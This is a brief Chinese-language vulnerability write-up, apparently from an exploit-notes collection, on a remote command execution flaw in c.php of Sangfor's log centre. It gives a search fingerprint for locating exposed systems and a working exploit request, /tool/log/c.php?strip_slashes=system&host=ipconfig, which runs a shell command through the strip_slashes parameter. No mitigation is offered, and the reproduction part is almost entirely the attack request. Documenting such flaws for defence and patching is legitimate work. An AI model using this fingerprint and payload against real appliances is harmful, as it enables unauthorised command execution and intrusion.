# 深信服 日志中心 c.php 远程命令执行漏洞

## 漏洞描述

深信服 日志中心 c.php 远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行

## 漏洞影响

```
深信服 日志中心
```

## 网络测绘

```
body="isHighPerformance : !!SFIsHighPerformance,"
```

## 漏洞复现

登录页面如下

![](../.gitbook/assets/202202091915868.png)

访问漏洞Url

```
/tool/log/c.php?strip_slashes=system&host=ipconfig
```

![](../.gitbook/assets/202202091915736.png)
